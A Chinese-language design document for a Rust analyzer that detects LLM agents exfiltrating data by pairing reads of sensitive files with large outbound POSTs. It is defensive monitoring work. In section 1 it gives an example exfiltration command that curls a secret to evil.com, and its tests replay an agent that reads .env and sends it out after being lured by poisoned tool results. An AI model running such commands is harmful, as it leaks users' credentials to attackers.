# DataExfiltrationDetector 设计文档

> **设计状态**: 提案阶段  
> **目标阶段**: AnomalyDetection (Stage 3)  
> **模块**: `collector/src/framework/analyzers/data_exfiltration_detector.rs`  
> **输出 source tag**: `data_exfil`

---

## 1. 名称与目的

**DataExfiltrationDetector (DED)**

检测 LLM agent 通过工具调用或 API 请求向外部传输敏感数据的流式分析器。
当 agent 读取了敏感文件（密钥、配置、源代码）后，在短时间内向外部端点发送
异常大的 HTTP POST 请求时，发出 `data_exfil` 告警。

### 问题

LLM agent 的安全风险之一是"数据走私"——agent 被诱导读取本地敏感文件，
然后通过工具调用（如 `bash("curl -X POST https://evil.com/collect -d @secret")`）
或模型响应将数据发送到外部。与凭证泄露（CredentialLeakAnalyzer 已覆盖）不同，
数据外泄关注的是**大容量数据传输**和**读取-发送关联模式**：

| 外泄模式 | 示例 | 特征 |
|---------|------|------|
| **读后即发** | `read_file(".env")` → 30s 内 `POST https://unknown-host/data` body 匹配 `.env` 内容 | 时间关联 + 内容关联 |
| **大容量上载** | 单次 POST body > 100KB 发往非 LLM API 端点 | 载荷大小异常 |
| **批量导出** | 短时间内连续 POST 到同一外部端点，累计 > 1MB | 传输量异常 |
| **隐蔽通道** | 将文件内容分片编码后通过多次小请求发送 | 请求频率 + 编码模式 |

如果不检测，这些行为会导致：
- **敏感数据泄露**：API 密钥、数据库凭证、客户数据被发送到攻击者控制的服务器
- **合规违规**：GDPR/HIPAA 等法规要求监控数据外传
- **供应链攻击**：攻击者通过投毒的工具结果诱导 agent 执行外泄

### 目标

1. **读后即发关联**：追踪 agent 近期读取的文件内容，检测其是否出现在后续
   HTTP POST body 中。
2. **大容量上载告警**：对超过阈值的单次 POST 请求发出告警。
3. **批量导出检测**：追踪短期内的累计外传量。
4. **分级告警**：根据外泄风险发出不同级别的 `data_exfil` 事件。
5. **低误报**：LLM API 的正常请求（`/v1/messages`、`/v1/chat/completions`）
   不计入外泄检测。

---

## 2. 管道中的位置

```
Preprocessing → CausalLinking → InjectionDetection
    │
    ▼
[DataExfiltrationDetector]   ← **此处** (AnomalyDetection stage)
    │
    ▼
AlertEnrichment → Output
```

### 为什么放在此处

- **位于 InjectionDetection 之后**：此时 CredentialLeakAnalyzer 和 
  HandoffInjectionAnalyzer 已完成检测，DED 可利用这些上游结果避免重复告警
  （例如，已被 CredentialLeakAnalyzer 标记的事件不需要 DED 再次告警）。
- **需要 FileAccessAuditAnalyzer 的输出**：DED 需要知道 agent 读取了哪些文件
  以及是否越界访问（workspace_boundary），才能判断内容关联。
- **位于 AlertEnrichment 之前**：DED 产生的 `data_exfil` 事件可作为 
  AlertEnrichment 阶段的输入，与其他异常事件联合归并。

### Stage contract amendments

| 属性 | 修改前 | 修改后 |
|-----|--------|--------|
| `consumes` | `process`, `system`, `http_parser`, `sse_processor`, `handoff_injection` | 新增 `file_access` |
| `produces` | `multi_agent_anomaly`, `context_pollution` | 新增 `data_exfil` |
| `length_preserving` | `true` | `false` (data_exfil 是额外 emit) |
| `pass_through` | `true` | `true` |

---

## 3. 接口: EventStream Contract

### 3.1 消费的事件格式

DED 关注具有"数据传输"语义的事件。具体来说：

| 来源 | 检测条件 | 提取字段 |
|-----|---------|---------|
| `http_parser` | `data.method == "POST"` 且 path 不匹配 LLM API 模式 | `data.body`（大小/内容）、`data.host`、`data.path`、`data.request_id` |
| `file_access` | `data.access_type == "Read"` | `data.filepath`、`data.file_context.size`、`data.workspace_boundary` |
| `ssl` | `data.operation == "SSL_write"` 且 len > 阈值 | `data.len`（用于传输量统计） |
| `process` | `data.action == "exec"` 且命令匹配外泄模式（curl POST, wget --post 等） | `data.full_command` |

对于不匹配上述条件的事件，直接透传，不参与外泄检测。

### 3.2 产出的事件

```rust
// data_exfil 事件 data 结构
{
    "alert_id": "uuid-v4",
    "exfil_type": "read_then_send | large_upload | batch_export | covert_channel",
    "severity": "low | medium | high | critical",
    "agent_root_pid": 12345,
    "source_file": "/home/user/.env",           // 读取的文件（read_then_send 模式）
    "destination": {
        "host": "evil.example.com",
        "path": "/collect",
        "port": 443
    },
    "payload_size_bytes": 102400,
    "total_exported_bytes": 512000,             // 批量导出累计
    "time_window_ms": 30000,                    // 外泄行为的时间窗口
    "matched_content_excerpt": "DATABASE_URL=...", // 内容匹配的摘要
    "matched_content_length": 256,
    "correlation_score": 0.92,                  // 读取-发送关联置信度
    "related_events": [
        {"source": "file_access", "timestamp_ns": ..., "filepath": "..."},
        {"source": "http_parser", "timestamp_ns": ..., "host": "..."}
    ],
    "evidence": {
        "file_read_count": 3,                    // 窗口内读取的敏感文件数
        "outbound_request_count": 5,             // 窗口内对外请求数
        "unique_destinations": 1,
        "llm_api_excluded": true                 // 已排除 LLM API 流量
    }
}
```

#### 事件类型定义

```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ExfilType {
    /// 读取敏感文件后短时间内向外部发送内容匹配的请求
    ReadThenSend,
    /// 单次 POST 请求体超过阈值
    LargeUpload,
    /// 短时间内向同一外部端点累计发送超过阈值
    BatchExport,
    /// 检测到分片/编码等隐蔽传输模式
    CovertChannel,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ExfilSeverity {
    /// 可疑但可能是正常行为（如大文件上传到已知 CDN）
    Low,
    /// 明确的数据外泄风险（读后即发，但目标为已知服务）
    Medium,
    /// 高置信度外泄（读后即发到未知端点）
    High,
    /// 已确认的外泄（匹配到已知恶意模式或超大量数据传输）
    Critical,
}
```

### 3.3 Trait 实现

```rust
#[async_trait]
impl Analyzer for DataExfiltrationDetector {
    async fn process(&mut self, stream: EventStream) -> Result<EventStream, AnalyzerError>;
    fn name(&self) -> &str { "DataExfiltrationDetector" }
}

impl StreamContractProvider for DataExfiltrationDetector {
    fn output_contract(&self) -> StreamContract {
        StreamContract {
            preserves_length: false,
            preserves_order: true,
            sources_produced: hashset!["data_exfil".into()],
        }
    }
}

impl DrainableAnalyzer for DataExfiltrationDetector {
    fn drain(&mut self) -> Vec<Event>;
    fn has_buffered_events(&self) -> bool;
}
```

---

## 4. 关键数据结构

### 4.1 文件读取记录

```rust
/// Agent 最近读取的文件记录，用于后续内容关联检测。
#[derive(Debug, Clone)]
struct FileReadRecord {
    /// 文件路径
    filepath: String,
    /// 文件大小（字节），来自 eBPF 或 FileAccessAudit
    file_size: usize,
    /// 读取时间戳
    timestamp_ns: u64,
    /// 读取此文件的 agent root PID
    agent_root_pid: u32,
    /// 是否在 workspace 外部（越界读取）
    is_outside_workspace: bool,
    /// 文件内容指纹（前 N 字节的滚动哈希）
    content_fingerprint: u64,
    /// 文件扩展名分类
    file_category: FileCategory,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum FileCategory {
    /// 凭证文件 (.env, credentials.json, .aws/credentials)
    Credential,
    /// 配置文件 (.toml, .yaml, .ini)
    Config,
    /// 源代码 (.rs, .ts, .py, .go)
    SourceCode,
    /// 数据文件 (.csv, .json, .db, .sqlite)
    Data,
    /// 密钥文件 (.pem, .key, .crt)
    Key,
    /// 其他
    Other,
}
```

### 4.2 外发请求记录

```rust
/// 记录一次对外的 HTTP POST 请求。
#[derive(Debug, Clone)]
struct OutboundRequestRecord {
    /// 请求 ID（来自 HTTPParser）
    request_id: String,
    /// 目标主机
    host: String,
    /// 目标路径
    path: String,
    /// 请求体大小
    body_size_bytes: usize,
    /// 请求时间戳
    timestamp_ns: u64,
    /// 发起请求的 agent PID
    agent_pid: u32,
    /// 请求体内容指纹（用于与文件读取记录匹配）
    body_fingerprint: Option<u64>,
    /// 是否已被分类为外泄
    flagged: bool,
}
```

### 4.3 滑动窗口追踪器

```rust
/// 按 agent_root_pid 维度追踪外泄行为。
struct AgentExfilTracker {
    /// 此 agent 在窗口内的文件读取记录
    recent_file_reads: VecDeque<FileReadRecord>,
    /// 此 agent 在窗口内的对外请求记录
    recent_outbound_requests: VecDeque<OutboundRequestRecord>,
    /// 到各目标的累计传输量: host -> total_bytes
    per_destination_bytes: HashMap<String, u64>,
    /// 窗口内总外传字节数
    total_exported_bytes: u64,
    /// 最后活跃时间
    last_active_ns: u64,
}
```

### 4.4 配置

```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DataExfilConfig {
    // ── 读后即发检测 ──
    /// 文件读取与后续外发请求之间的最大时间窗口（纳秒）
    pub read_send_window_ns: u64,              // 默认: 60s
    /// 读取文件后追踪的最大文件记录数
    pub max_tracked_file_reads: usize,         // 默认: 100
    /// 内容指纹匹配使用的滚动哈希窗口大小（字节）
    pub fingerprint_window_bytes: usize,       // 默认: 64

    // ── 大容量上载 ──
    /// 单次 POST 触发告警的 body 大小阈值（字节）
    pub large_upload_threshold_bytes: usize,   // 默认: 100KB
    /// 大容量告警需要的最小文件读取关联数（0 = 不需要关联）
    pub large_upload_min_reads: usize,         // 默认: 1

    // ── 批量导出 ──
    /// 批量导出的时间窗口（纳秒）
    pub batch_export_window_ns: u64,           // 默认: 120s
    /// 批量导出累计大小阈值（字节）
    pub batch_export_threshold_bytes: usize,   // 默认: 500KB
    /// 批量导出需要的最小请求数
    pub batch_export_min_requests: usize,      // 默认: 3

    // ── LLM API 排除 ──
    /// 不参与外泄检测的 API 路径前缀
    pub llm_api_path_prefixes: Vec<String>,    // 默认: ["/v1/messages", "/v1/chat/completions"]

    // ── 敏感文件 ──
    /// 触发关注的文件扩展名列表
    pub sensitive_extensions: Vec<String>,     // 默认: [".env", ".pem", ".key", ".credentials", ".secret"]
    /// 触发关注的文件路径模式
    pub sensitive_path_patterns: Vec<String>,  // 默认: [".aws/", ".ssh/", ".config/gh/", "credentials"]

    // ── 严重度阈值 ──
    /// low 级别的 payload 大小下限
    pub severity_low_bytes: usize,             // 默认: 10KB
    /// medium 级别的 payload 大小下限
    pub severity_medium_bytes: usize,          // 默认: 50KB
    /// high 级别的 payload 大小下限
    pub severity_high_bytes: usize,            // 默认: 100KB
    /// critical 级别的 payload 大小下限
    pub severity_critical_bytes: usize,        // 默认: 1MB

    // ── 抑制与冷却 ──
    /// 同一 (agent_root_pid, destination) 的告警冷却时间（纳秒）
    pub cooldown_ns: u64,                      // 默认: 120s
    /// 外泄追踪器的过期时间（纳秒）
    pub tracker_ttl_ns: u64,                   // 默认: 300s
    /// 最大活跃追踪器数
    pub max_active_trackers: usize,            // 默认: 64
}

impl Default for DataExfilConfig {
    fn default() -> Self {
        Self {
            read_send_window_ns: 60_000_000_000,
            max_tracked_file_reads: 100,
            fingerprint_window_bytes: 64,
            large_upload_threshold_bytes: 100_000,
            large_upload_min_reads: 1,
            batch_export_window_ns: 120_000_000_000,
            batch_export_threshold_bytes: 500_000,
            batch_export_min_requests: 3,
            llm_api_path_prefixes: vec![
                "/v1/messages".into(),
                "/v1/chat/completions".into(),
            ],
            sensitive_extensions: vec![
                ".env".into(), ".pem".into(), ".key".into(),
                ".credentials".into(), ".secret".into(),
            ],
            sensitive_path_patterns: vec![
                ".aws/".into(), ".ssh/".into(),
                ".config/gh/".into(), "credentials".into(),
            ],
            severity_low_bytes: 10_000,
            severity_medium_bytes: 50_000,
            severity_high_bytes: 100_000,
            severity_critical_bytes: 1_000_000,
            cooldown_ns: 120_000_000_000,
            tracker_ttl_ns: 300_000_000_000,
            max_active_trackers: 64,
        }
    }
}
```

---

## 5. 数据流

```
EventStream (http_parser, file_access, ssl, process)
  │
  ▼
DataExfiltrationDetector::process()
  │
  ├── 对每个事件:
  │     1. 根据 source 分类处理
  │        │
  │        ├── source == "file_access" 且 access_type == "Read":
  │        │   ├── 提取 filepath, file_size, workspace_boundary, agent_root_pid
  │        │   ├── 检查 filepath 是否匹配 sensitive_extensions 或 sensitive_path_patterns
  │        │   ├── 如果是敏感文件或有越界读取标记:
  │        │   │   └── 创建 FileReadRecord，加入 AgentExfilTracker
  │        │   └── 非敏感文件:
  │        │       └── 超过 max_tracked_file_reads 时才记录（用于批量关联）
  │        │
  │        ├── source == "http_parser" 且 method == "POST":
  │        │   ├── 提取 host, path, body_size, request_id, agent_pid
  │        │   ├── 检查 path 是否匹配 llm_api_path_prefixes:
  │        │   │   ├── 匹配 → 跳过（LLM API 正常流量）
  │        │   │   └── 不匹配 → 继续检测
  │        │   ├── 检查 body_size >= large_upload_threshold_bytes:
  │        │   │   ├── 查找该 agent 最近的 FileReadRecord
  │        │   │   ├── 如果存在时间窗口内的文件读取:
  │        │   │   │   └── 计算 fingerprint 相似度 → 如果匹配 → ExfilType::ReadThenSend
  │        │   │   └── 如果不存在（但 body_size 仍超阈值）:
  │        │   │       └── ExfilType::LargeUpload
  │        │   ├── 更新 AgentExfilTracker:
  │        │   │   ├── 追加 OutboundRequestRecord
  │        │   │   ├── 更新 per_destination_bytes
  │        │   │   └── 更新 total_exported_bytes
  │        │   └── 检查批量导出:
  │        │       └── 如果 total_exported_bytes >= batch_export_threshold_bytes
  │        │           且请求数 >= batch_export_min_requests:
  │        │           └── ExfilType::BatchExport
  │        │
  │        ├── source == "ssl" 且 operation == "SSL_write":
  │        │   └── 仅用于辅助传输量统计（补充 HTTPParser 未覆盖的 TLS 流量）
  │        │
  │        └── 其他 source:
  │            └── 直接透传
  │
  │     2. 如果触发告警:
  │        ├── 确定 severity（基于 payload 大小和文件类型）
  │        ├── 检查冷却期
  │        ├── 生成 data_exfil 事件
  │        └── 设置冷却时间戳
  │
  │     3. 清理过期数据:
  │        ├── 淘汰超过 tracker_ttl_ns 的 AgentExfilTracker
  │        ├── 淘汰窗口外的 FileReadRecord
  │        └── 淘汰窗口外的 OutboundRequestRecord
  │
  │     4. 输出: 原始事件 + data_exfil 告警事件
  │
  └── flatten → EventStream (输出)
```

### 可视化流程图

```
                    ┌──────────────────────────┐
                    │     Input EventStream      │
                    │  (http, file_access, ssl) │
                    └────────────┬─────────────┘
                                 │
                    ┌────────────▼─────────────┐
                    │   按 source 分流          │
                    └──┬────────┬────────┬─────┘
                       │        │        │
              ┌────────▼──┐ ┌──▼────┐ ┌─▼──────────┐
              │file_access│ │http   │ │ssl/process  │
              │(Read)     │ │POST   │ │(辅助统计)    │
              └─────┬─────┘ └──┬────┘ └──────┬──────┘
                    │          │              │
         ┌─────────▼──┐  ┌───▼──────────┐   │
         │敏感文件?    │  │LLM API 路径? │   │
         └──┬──────┬──┘  └──┬──────┬───┘   │
            │Yes   │No      │Yes   │No      │
       ┌────▼──┐ ┌▼────┐ ┌─▼──┐ ┌─▼────────▼──┐
       │记录到  │ │条件 │ │跳过│ │外泄检测逻辑  │
       │Tracker│ │记录 │ └────┘ └──────┬───────┘
       └───┬───┘ └──┬──┘               │
           │        │          ┌───────▼────────┐
           │        │          │  ReadThenSend? │
           │        │          │  LargeUpload?   │
           │        │          │  BatchExport?   │
           │        │          └───┬──────┬──────┘
           │        │              │      │
           │        │         ┌────▼──┐ ┌─▼────────┐
           │        │         │无告警 │ │触发告警   │
           │        │         └──┬───┘ └──┬────────┘
           │        │            │        │
           └────────┴────────────┴────────┘
                                 │
                    ┌────────────▼─────────────┐
                    │  清理过期数据              │
                    │  (tracker, reads, reqs)   │
                    └────────────┬─────────────┘
                                 │
                    ┌────────────▼─────────────┐
                    │   Output EventStream       │
                    │   (原始 + data_exfil)      │
                    └──────────────────────────┘
```

---

## 6. 关键实现决策

### 6a. 内容指纹匹配

使用滚动哈希（Rabin-Karp 风格）计算文件和 HTTP body 的轻量指纹，
避免全内容哈希的 O(n) 开销和存储成本。

```rust
/// 使用 polynomial rolling hash 计算字节窗口的指纹。
fn rolling_fingerprint(data: &[u8], window_size: usize) -> Vec<u64> {
    const BASE: u64 = 257;
    const MOD: u64 = 1_000_000_007;

    let mut fingerprints = Vec::with_capacity(data.len().saturating_sub(window_size) + 1);
    let mut hash: u64 = 0;
    let mut power: u64 = 1;

    for i in 0..data.len() {
        hash = (hash * BASE + data[i] as u64) % MOD;
        if i >= window_size {
            hash = (hash + MOD - (data[i - window_size] as u64 * power % MOD)) % MOD;
        } else {
            power = (power * BASE) % MOD;
        }
        if i >= window_size - 1 {
            fingerprints.push(hash);
        }
    }
    fingerprints
}

/// 比较两个指纹集合的 Jaccard 相似度。
fn fingerprint_similarity(a: &[u64], b: &[u64]) -> f64 {
    let set_a: HashSet<u64> = a.iter().copied().collect();
    let set_b: HashSet<u64> = b.iter().copied().collect();
    let intersection = set_a.intersection(&set_b).count();
    let union = set_a.union(&set_b).count();
    if union == 0 { 0.0 } else { intersection as f64 / union as f64 }
}
```

**注意**：当前 eBPF 探针不提供文件内容。指纹匹配仅适用于以下场景：
- HTTP body 内容已在 HTTPParser 中解析
- 文件内容指纹需要在 FileAccessAuditAnalyzer 或 eBPF 层配合实现

在没有文件内容指纹的情况下，DED 依赖**时间关联**（读取后短时间内发送）+
**元数据关联**（文件大小与 body 大小相关性）进行匹配。内容指纹是可选增强。

### 6b. LLM API 请求排除

LLM API 的正常请求（发送 conversation history 给模型）可能很大
（包含大量 messages、tool_results），不应触发外泄告警。

排除逻辑：
```rust
fn is_llm_api_request(path: &str, prefixes: &[String]) -> bool {
    prefixes.iter().any(|prefix| path.starts_with(prefix))
}
```

默认排除：`/v1/messages`（Anthropic）和 `/v1/chat/completions`（OpenAI）。
可通过配置扩展。

### 6c. 严重度计算

严重度基于三个维度的组合：

```rust
fn compute_severity(
    exfil_type: &ExfilType,
    payload_size: usize,
    file_category: Option<&FileCategory>,
    destination_is_known: bool,
    config: &DataExfilConfig,
) -> ExfilSeverity {
    let size_severity = if payload_size >= config.severity_critical_bytes {
        4
    } else if payload_size >= config.severity_high_bytes {
        3
    } else if payload_size >= config.severity_medium_bytes {
        2
    } else {
        1
    };

    let file_bonus = match file_category {
        Some(FileCategory::Credential) | Some(FileCategory::Key) => 2,
        Some(FileCategory::Config) | Some(FileCategory::Data) => 1,
        _ => 0,
    };

    let type_bonus = match exfil_type {
        ExfilType::ReadThenSend => 2,
        ExfilType::CovertChannel => 2,
        ExfilType::BatchExport => 1,
        ExfilType::LargeUpload => 0,
    };

    let dest_penalty = if destination_is_known { -1 } else { 0 };

    match size_severity + file_bonus + type_bonus + dest_penalty {
        s if s >= 7 => ExfilSeverity::Critical,
        s if s >= 5 => ExfilSeverity::High,
        s if s >= 3 => ExfilSeverity::Medium,
        _ => ExfilSeverity::Low,
    }
}
```

### 6d. 冷却与告警去重

- 每个 `(agent_root_pid, destination_host, exfil_type)` 三元组维护独立冷却时间戳
- 同一 agent 向同一目标的不同类型外泄（如同时 ReadThenSend 和 BatchExport）
  可以各自触发告警
- 冷却期内累积数据仍被追踪，冷却结束后如果条件满足可重新告警

### 6e. 内存管理

- `AgentExfilTracker` 最大数量：`max_active_trackers`（默认 64）
- 每个 tracker 的 `recent_file_reads`：`max_tracked_file_reads`（默认 100）
- 每个 tracker 的 `recent_outbound_requests`：无硬限制，由时间窗口自然淘汰
- 不活跃 tracker：超过 `tracker_ttl_ns`（默认 300s）自动清理

总内存估算：64 trackers × (100 reads × ~256B + 50 requests × ~256B) ≈ **2.5 MB**。

### 6f. 与 CredentialLeakAnalyzer 的边界

| 维度 | CredentialLeakAnalyzer | DataExfiltrationDetector |
|------|----------------------|------------------------|
| 检测对象 | 凭证模式（API key 正则） | 大容量数据传输 |
| 关注字段 | HTTP body 中的 token 模式 | HTTP body 大小、目标、文件关联 |
| 上下文门控 | 需要 shared_handoff.md + leak_probe.txt | 不需要特定文件门控 |
| 事件类型 | `credential_leak` | `data_exfil` |
| 重叠处理 | 如果 CLA 已标记，DED 跳过该事件（通过 `data.credential_leak_flagged` 字段检查） | — |

---

## 7. 模块注册

编辑 `analyzers/mod.rs`：

```rust
pub mod data_exfiltration_detector;
pub use data_exfiltration_detector::{
    DataExfiltrationDetector, DataExfilConfig,
    ExfilType, ExfilSeverity,
};
```

在 `EventSource` 枚举中添加：

```rust
pub enum EventSource {
    // ... 现有变体 ...
    DataExfil,
}

impl EventSource {
    pub fn as_str(self) -> &'static str {
        match self {
            // ...
            Self::DataExfil => "data_exfil",
        }
    }
}
```

在 `PipelineOrchestratorImpl` 中注册：

```rust
// AnomalyDetection stage
pipeline.add_anomaly_detector(Box::new(
    DataExfiltrationDetector::new(DataExfilConfig::default())
))?;
```

---

## 8. 测试策略

### 8.1 单元测试

| 测试用例 | 验证内容 |
|---------|---------|
| `test_read_then_send_detection` | 读取 .env 后 30s 内 POST 到外部 → ExfilType::ReadThenSend |
| `test_read_then_send_no_match` | 读取 .env 后 120s 才 POST → 无告警（超出窗口） |
| `test_large_upload_detection` | 单次 POST body = 200KB → ExfilType::LargeUpload |
| `test_large_upload_below_threshold` | 单次 POST body = 50KB → 无告警 |
| `test_llm_api_excluded` | POST /v1/messages body = 500KB → 无告警（LLM API） |
| `test_batch_export_detection` | 5 次 POST 到同一 host，累计 600KB → ExfilType::BatchExport |
| `test_batch_export_below_threshold` | 5 次 POST 累计 300KB → 无告警 |
| `test_cooldown_suppression` | 触发告警后 120s 内同 agent+host 不再告警 |
| `test_severity_credential_file` | 读取 .pem + 100KB POST → High 或以上 |
| `test_severity_normal_file` | 读取 .log + 10KB POST → Low |
| `test_tracker_cleanup` | 超过 tracker_ttl_ns 不活跃 → tracker 被清理 |
| `test_non_target_events_passthrough` | process、system 等非关注事件直接透传 |
| `test_credential_leak_skip` | event.data.credential_leak_flagged=true → DED 跳过 |
| `test_fingerprint_similarity_match` | 相同内容的两个窗口 → 相似度 > 0.9 |
| `test_fingerprint_similarity_no_match` | 不同内容 → 相似度 < 0.1 |

### 8.2 集成测试

- **完整读取-发送链**：构造 agent 读取 `.env` → POST 内容到 `evil.com/collect`
  的完整事件流，验证 DED 在窗口内发出告警。
- **多 Agent 场景**：3 个 agent 各自读取不同文件 → 各自 POST → 各自触发独立告警，
  验证 tracker 按 agent_root_pid 正确隔离。
- **与 CredentialLeakAnalyzer 共存**：构造同时触发 CLA 和 DED 的事件流，
  验证 DED 正确跳过 CLA 已标记的事件。
- **高吞吐场景**：1000 events/sec，80% 非关注事件 → 验证 DED 不影响管道吞吐。

### 8.3 回归防护

- 在已有异常检测场景中启用 DED，验证现有检测不受影响。
- 确保 DED 的 `pass_through=true` 不修改任何原始事件。

---

## 9. 风险评估

| 风险 | 严重度 | 缓解措施 |
|-----|--------|---------|
| **文件内容指纹不可用** | 中 | eBPF 探针当前不提供文件内容。DED 依赖时间关联+元数据关联作为主要信号；内容指纹作为可选增强。FileAccessAuditAnalyzer 未来可扩展提供文件内容哈希 |
| **误报：合法大文件上传** | 中 | LLM API 排除列表 + 可配置的 known_hosts 白名单（未来扩展） |
| **漏报：分片外泄** | 低 | CovertChannel 检测模式 + 批量导出的累计统计可捕获分片外泄的聚合模式 |
| **Tracker 膨胀** | 低 | 硬限制 max_active_trackers + TTL 淘汰；总内存 < 3MB |
| **冷却期过长导致升级告警丢失** | 低 | 冷却期内仍更新数据；冷却结束后检查是否需要升级告警 |
| **与其他分析器重复告警** | 低 | 通过检查 CredentialLeakAnalyzer 标记避免重复 |

---

## 10. 总结

**DataExfiltrationDetector (DED)** 是一个针对 LLM agent 数据外泄行为的流式异常
分析器。它消费 http_parser、file_access 和 ssl 事件，通过三种检测策略
（读后即发关联、大容量上载、批量导出）识别数据外泄模式，并发出分级告警。

关键设计特性：
- **非侵入**：所有原始事件透传，不修改、不过滤。data_exfil 是额外衍生事件。
- **低误报**：LLM API 流量自动排除；依赖时间关联+元数据关联而非单一信号。
- **与现有分析器互补**：不与 CredentialLeakAnalyzer 重叠，通过标记检查协作。
- **内存友好**：固定 tracker 数量 + TTL 淘汰，总额 < 3MB。
- **分级告警**：low → medium → high → critical 四级严重度，冷却机制避免告警风暴。
- **可配置**：所有阈值、窗口、排除列表均可通过 DataExfilConfig 调整。

DED 位于 6 阶段管道的 AnomalyDetection（Stage 3），在 InjectionDetection 之后、
AlertEnrichment 之前。实现估计约 350 行 Rust + 250 行测试。
